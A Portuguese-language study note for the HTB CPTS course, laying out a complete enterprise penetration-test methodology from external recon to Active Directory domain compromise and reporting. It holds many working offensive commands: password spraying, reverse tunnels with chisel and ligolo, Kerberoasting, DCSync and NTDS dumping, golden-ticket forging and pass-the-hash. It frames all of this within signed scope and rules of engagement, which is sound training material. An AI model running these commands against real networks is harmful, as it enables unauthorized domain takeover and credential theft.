---
tema: Enterprise
tópico: Attacking Enterprise Networks — engajamento completo do recon externo ao domínio
tags: [htb, cpts, enterprise, active-directory, pivoting, killchain, metodologia]
dificuldade: medium
---

# 🏢 CPTS 28 - Attacking Enterprise Networks

> [!info] Objetivo
> Simular um engajamento **completo** contra uma rede corporativa: reconhecimento externo → acesso inicial → situação → privesc → pivoting → AD → compromisso do domínio → relatório. Esta nota é o **índice operacional**: cada fase aponta para a cheatsheet detalhada e traz o checklist e o "se travar, olhe isto".

> [!warning] Escopo primeiro
> Nada aqui começa antes de escopo/RoE assinados ([[Fase 01 - Pré-Engajamento]]). Host fora do escopo não se toca; dado real de cliente não se copia.

---

## 🎯 Quando usar

| Cenário | Ponto de partida |
|---------|------------------|
| Você recebeu só um domínio/faixa externa | Seção **1. Recon externo** |
| Já tem credencial de domínio (usuário comum) | Seção **5. Domínio: enumeração credenciada** |
| Tem shell em host de borda, sem AD visível | Seção **4. Pivoting** |
| Skills assessment / exame CPTS | Fluxo inteiro, na ordem, com checklists |
| Ataque travou | Tabela **🆘 Se travar, olhe isto** |

> [!tip] Mentalidade enterprise
> Em rede corporativa **não existe "uma vuln"**. Existe **cadeia**: um vhost esquecido dá uma credencial, a credencial dá um share, o share dá um hash, o hash dá um host, o host dá sessão de admin, a sessão dá o domínio. Mantenha um grafo mental (ou BloodHound) do que conecta o quê.

---

## 🧰 Ferramentas por fase

| Fase | Ferramentas principais | Cheatsheet |
|------|-----------------------|-----------|
| Recon externo | `dnsx`, `subfinder`, `amass`, `httpx`, `whatweb`, `ffuf`, `theHarvester` | [[CPTS 05 - Information Gathering - Web Edition]] |
| Recon de rede | `nmap`, `fping`, `masscan` | [[CPTS 03 - Network Enumeration with Nmap]] |
| Enum de serviços | `smbclient`, `rpcclient`, `ldapsearch`, `snmpwalk`, `enum4linux-ng` | [[CPTS 04 - Footprinting]] |
| Web | `ffuf`, `feroxbuster`, Burp | [[CPTS 15 - Attacking Web Applications with Ffuf]] |
| Credenciais | `kerbrute`, `hydra`, `netexec`, `responder` | [[CPTS 10 - Password Attacks]] |
| AD | `bloodhound-python`, `netexec`, `*.py` (impacket), `evil-winrm`, `rubeus`, `certipy` | [[CPTS 13 - Active Directory Enumeration and Attacks]] |
| Pivoting | `ligolo-ng`, `chisel`, `proxychains`, `socat`, `ssh -D` | [[CPTS 12 - Pivoting, Tunneling, and Port Forwarding]] |
| Privesc | `linpeas`, `winPEAS`, `PowerUp`, `PrivescCheck` | [[CPTS 25 - Linux Privilege Escalation]] / [[CPTS 26 - Windows Privilege Escalation]] |
| Relatório | Obsidian, CherryTree, pandoc | [[CPTS 27 - Documentation and Reporting]] |

---

## 1️⃣ Recon externo

```bash
# 🐧 Resolver o alvo e mapear infraestrutura pública
dig +short <DOMINIO> A; dig +short <DOMINIO> MX; dig +short <DOMINIO> NS
host -t txt <DOMINIO>                      # SPF/DMARC revelam provedores e terceiros

# 🐧 Subdomínios: passivo + brute force controlado
subfinder -d <DOMINIO> -silent | tee subs.txt
dnsx -l subs.txt -a -resp -silent | tee subs_ips.txt
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -u https://<DOMINIO> -H "Host: FUZZ.<DOMINIO>" -fc 404 -t 50

# 🐧 Filtro de hosts vivos e tecnologia
httpx -l subs.txt -sc -title -tech-detect -o web_alive.txt
whatweb -a 3 https://<DOMINIO>

# 🐧 Enum de conteúdo nos vhosts descobertos (o esquecido é o que dá acesso)
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -u https://<ALVO>/FUZZ -fc 403,404 -t 60
```

**Checklist — recon externo**
- [ ] DNS completo (A, MX, TXT, SPF/DMARC), ASN e faixa de IPs do alvo
- [ ] Subdomínios ativos + tecnologias (frameworks, versões, CMS)
- [ ] Vhosts e diretórios escondidos (`dev`, `staging`, `jenkins`, `gitlab`, `vpn`)
- [ ] Vazamentos: repositórios públicos, pastes, metadados, `robots.txt`, `.git/`
- [ ] Portais de login identificados (VPN, OWA, RDWeb, Citrix) — futuros alvos de brute/spray
- [ ] Tudo salvo em arquivo datado (nada só na memória)

---

## 2️⃣ Acesso inicial

```bash
# 🐧 Serviços comuns: validar versão e fraqueza antes de tentar exploit
nmap -sC -sV -p- --min-rate 2000 -oA ext_full <IP>
netexec smb <IP> -u '' -p '' --shares          # null session
netexec rdp <IP>                                # exposição de RDP
nmap --script http-title,http-headers -p 80,443,8080,8443 <IP>

# 🐧 Password spraying — UMA senha contra muitos usuários (evita lockout)
netexec smb <IP> -u users.txt -p '<SENHA>' --continue-on-success
# 🐧 Kerberos pre-auth enumeration (sem lockout, ruído baixo)
kerbrute userenum -d <DOMINIO> --dc <IP> users.txt

# 🐧 Exploit web quando a superfície for aplicação (upload, SQLi, SSRF, LFI)
#    → ver CPTS 17-24; sempre prefira o caminho que devolve SHELL, não só prova.
```

**Checklist — acesso inicial**
- [ ] Portas e versões do alvo externo levantadas (`-p-`, sem pressa)
- [ ] Credencial fraca testada de forma **controlada** (respeitar lockout policy)
- [ ] Vulnerabilidade web validada manualmente (não só o scanner)
- [ ] Foothold = execução de comando? (não só leitura/erro)
- [ ] Shell estável obtido ([[Fase 07 - Shells e Transferência de Arquivos]])
- [ ] Credenciais novas registradas na tabela de credenciais

---

## 3️⃣ Situação do host (post-exploitation imediato)

```bash
# 🐧 Linux: quem sou, onde estou, o que alcanço
id; hostname; uname -a
sudo -l
ss -tulpn | grep LISTEN
ip a; ip route; cat /etc/hosts
env; cat /etc/passwd | grep -v nologin

# 🪟 Windows: token, domínio e vizinhança
whoami /all
systeminfo
ipconfig /all; route print; netstat -ano
net user /domain; net group /domain; net group "Domain Admins" /domain
```

**Checklist — situação**
- [ ] Domínio? (`whoami` retornando `<DOMINIO>\<USUARIO>` = rede AD)
- [ ] Host tem segunda interface / rota para rede interna?
- [ ] Serviços locais em `127.0.0.1` (painel de admin, banco, API)
- [ ] ARP/`net neighbor`: descobrir vizinhos de rede
- [ ] Credenciais em arquivos, histórico, variáveis, configs de app
- [ ] Ferramentas de enum transferidas e executadas (linpeas/winPEAS)

---

## 4️⃣ Pivoting

```bash
# 🐧 Rede interna invisível de fora: precisa de túnel pelos hosts comprometidos.

# Opção A — ligolo-ng (rápido, TUN, sem proxy por app)
#  🐧 atacante:
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
#  no alvo (agent): ./agent -connect <IP>:11601 -ignore-cert
#  no console do proxy: session → ifconfig → start

# Opção B — chisel (SOCKS5 + port forward; leve, funciona atrás de proxy)
#  🐧 atacante: chisel server -p 8080 --reverse
#  no alvo: chisel client <IP>:8080 R:socks
#  🐧 proxychains: adicionar socks5 127.0.0.1 1080 em /etc/proxychains.conf
proxychains -q netexec smb <IP_INTERNO> -u <USUARIO> -p '<SENHA>'

# Opção C — port forward simples (um serviço só)
#  ssh -D 1080 <USUARIO>@<HOST_PIVOT>      # SOCKS dinâmico via SSH
#  socat TCP-LISTEN:8081,fork TCP:<IP_INTERNO>:80
```

**Checklist — pivoting**
- [ ] Hosts internos descobertos (scan pelo túnel, `proxychains nmap -sT`)
- [ ] Túnel estável o suficiente para SMB/LDAP/Kerberos (TCP puro)
- [ ] Ferramentas do atacante alcançando a rede interna (teste com `netexec`)
- [ ] Documentado o caminho de rede (quem enxerga quem)
- [ ] Cada novo host comprometido é avaliado como **novo ponto de pivô**

> [!warning] Kerberos pelo túnel
> Autenticação Kerberos depende de resolução de nome e UDP/TCP 88. Pelo proxy, sempre use IP e `-k` com cuidado — hostname/SPN errado derruba a autenticação.

---

## 5️⃣ AD: enumeração credenciada e movimentação

```bash
# 🐧 Credencial de domínio em mãos → mapear TUDO de uma vez
netexec smb <DC> -u <USUARIO> -p '<SENHA>' -d <DOMINIO> --users --groups --shares
netexec ldap <DC> -u <USUARIO> -p '<SENHA>' -d <DOMINIO> --trusted-for-delegation

# 🐧 BloodHound: coletar e achar o CAMINHO (não a lista de tudo)
bloodhound-python -u '<USUARIO>' -p '<SENHA>' -d <DOMINIO> -ns <DC> -c All
#  Depois, no BloodHound: "Shortest Paths from Owned Principals to Domain Admins"

# 🐧 Shares: o achado mais frequente em engajamento real
smbclient -L //<DC> -U '<DOMINIO>/<USUARIO>%<SENHA>'
netexec smb <DC> -u <USUARIO> -p '<SENHA>' -M spider_plus -o EXCLUDE_DIR=IPC$,print$

# 🪟 Execução remota quando você tem admin local/domínio
evil-winrm -i <IP> -u <USUARIO> -p '<SENHA>'
psexec.py <DOMINIO>/<USUARIO>:<SENHA>@<IP>
netexec winrm <IP> -u <USUARIO> -H <HASH>        # pass-the-hash

# 🟪 Ataques AD clássicos (ver detalhe em CPTS 13)
#   AS-REP roasting → Kerberoasting → delegation → ADCS (ESC1..) → RBCD → DCSync
kerbrute passwordspray -d <DOMINIO> users.txt '<SENHA>'
GetUserSPNs.py <DOMINIO>/<USUARIO>:<SENHA> -dc-ip <DC> -request
GetNPUsers.py <DOMINIO>/ -usersfile users.txt -dc-ip <DC> -no-pass
certipy find -u <USUARIO>@<DOMINIO> -p '<SENHA>' -dc-ip <DC> -vulnerable
```

**Checklist — AD**
- [ ] BloodHound coletado e **caminho** até Domain Admin identificado
- [ ] Shares revisados por credenciais, scripts (`.ps1`, `.bat`, `.kdbx`) e backups
- [ ] Kerberoasting/AS-REP tentados (contas de serviço e "sem preauth")
- [ ] Delegação (unconstrained/constrained/RBCD) avaliada
- [ ] ADCS verificado com Certipy (`-vulnerable`)
- [ ] `netexec` marcando onde a credencial funciona (local admin / SMB / WinRM)
- [ ] Cada credencial nova REPETE a enumeração (share novo → hash novo → host novo)

---

## 6️⃣ Compromisso do domínio

```bash
# 🐧 Objetivo do escopo: controle do domínio. Caminhos típicos:
#  admin local no DC → dump de NTDS → krbtgt → domínio inteiro
secretsdump.py <DOMINIO>/<USUARIO>:<SENHA>@<DC> -just-dc-ntlm
secretsdump.py -hashes :<HASH_NTLM> <DOMINIO>/<USUARIO>@<DC>

# 🟪 Com sessão no DC (mimikatz):
#   lsadump::dcsync /domain:<DOMINIO> /user:<DOMINIO>\krbtgt
#   sekurlsa::tickets /export   → pass-the-ticket

# 🐧 Golden ticket com o hash do krbtgt (persistência — só com autorização escrita)
ticketer.py -nthash <HASH_KRBTGT> -domain-sid <SID> -domain <DOMINIO> administrator
export KRB5CCNAME=administrator.ccache
psexec.py <DOMINIO>/administrator@<DC> -k -no-pass

# 🐧 Prova de domínio: acesso administrativo ao DC + evidência datada
netexec smb <DC> -u administrator -H <HASH> -x "whoami"
```

**Checklist — domínio comprometido**
- [ ] Domain Admin (ou equivalente: DCSync, AdminSDHolder, ADCS) alcançado
- [ ] `NTDS.dit`/DCSync executado e hashes **protegidos** no relatório (nunca em texto puro)
- [ ] Persistência criada **só** se o escopo permitir; documentada
- [ ] Objetivo do engajamento alcançado e registrado com evidência datada
- [ ] Movimento lateral e hosts críticos mapeados
- [ ] Limpeza: contas criadas, payloads, arquivos enviados, artefatos removidos

---

## 7️⃣ Relatório e encerramento

```text
Estrutura mínima → ver CPTS 27.
Narrativa do engajamento = cadeia:
  vhost esquecido → credencial em .git → share legível → hash Kerberoast
  → host com admin local → sessão → dump de NTDS → Domain Admin.
A cadeia é o que o cliente paga: ela mostra que UMA correção quebra o ataque todo.
```

**Checklist — encerramento**
- [ ] Sumário executivo escrito e revisado
- [ ] Findings com CVSS, reprodução, impacto, evidência e remediação
- [ ] Cadeia de ataque desenhada (diagrama/fluxo) no relatório
- [ ] Recomendações priorizadas e acionáveis (quick wins primeiro)
- [ ] Reteste acordado e agendado
- [ ] Artefatos de teste removidos; dados copiados destruídos conforme o contrato

---

## 🆘 Se travar, olhe isto

| Sintoma | Causa provável | Próximo passo |
|---------|----------------|---------------|
| Nmap externo só mostra 80/443 | Superfície mínima | Vhost brute, certificados (`crt.sh`), portas altas, UDP |
| Sem credencial nenhuma | Enum incompleta, não "sem vuln" | Null session SMB, SMB signing, RID brute, pré-execução de `nmap --script` |
| Credencial não funciona em lugar nenhum | Escopo errado (local vs domínio) | Testar em SMB, WinRM, LDAP, RDP, MSSQL e no host certo |
| Shell cai constantemente | Payload/shell instável | Shell estável, `rlwrap`, `python3 pty.spawn`, mover para executável |
| Não enxergo a rede interna | Sem pivô | Ligolo-ng/chisel; reconferir rotas e ARP do host comprometido |
| BloodHound "nada" | Coleta incompleta ou sem ACL explorável | Coletar `-c All`, revisar sessions/ACL, testar shares manualmente |
| Kerberoast sem quebra | Hash de senha forte | Reuso, spray, ADCS, ou caminho alternativo (não insistir no hash) |
| WinRM/SMB negam minha credencial | Não é admin ou protocolo bloqueado | Testar outro protocolo; verificar grupos e ACL local |
| Root no host mas não no domínio | Diretório local ≠ AD | Dump de credenciais em memória, arquivos de config, shares |
| Tudo "parece" corrigido no relatório | Achado sem reprodução | Reescrever com passos exatos e evidência datada |

> [!tip] A pergunta que destrava
> "Já usei esta credencial/host em **todos** os protocolos e caminhos possíveis?" e "Já repeti a enumeração deste host **depois** de cada achado novo?" Na maioria das vezes, a resposta é não — e é aí que está o caminho.

---

## ✅ Checklist mestre do engajamento enterprise

- [ ] Escopo, RoE e janela confirmados
- [ ] Recon externo completo (DNS, subdomínios, vhosts, tecnologias, vazamentos)
- [ ] Portas e serviços externos mapeados (`-oA`)
- [ ] Acesso inicial validado manualmente
- [ ] Shell estável + ferramentas transferidas
- [ ] Situação do host concluída (domínio? rotas? serviços locais?)
- [ ] Privesc local → root/SYSTEM no host de borda
- [ ] Pivoting para rede interna funcionando
- [ ] Enumeração credenciada (BloodHound, shares, LDAP) executada
- [ ] Ataques AD aplicáveis testados (Kerberoast, AS-REP, delegação, ADCS)
- [ ] Domain Admin / objetivo do escopo atingido
- [ ] Evidências datadas de cada marco
- [ ] Relatório com cadeia de ataque e remediações priorizadas
- [ ] Reteste agendado e artefatos removidos

---

## 🔗 Relacionado

- [[Workflow do Engage]] — visão fase a fase do engajamento completo
- [[CPTS 13 - Active Directory Enumeration and Attacks]] — o detalhe de cada ataque AD
- [[CPTS 12 - Pivoting, Tunneling, and Port Forwarding]] — Ligolo, chisel e SOCKS
- [[CPTS 27 - Documentation and Reporting]] — virar tudo isto em relatório
- [[Fase 09 - Active Directory]] — checklist de fase do AD no vault de fases
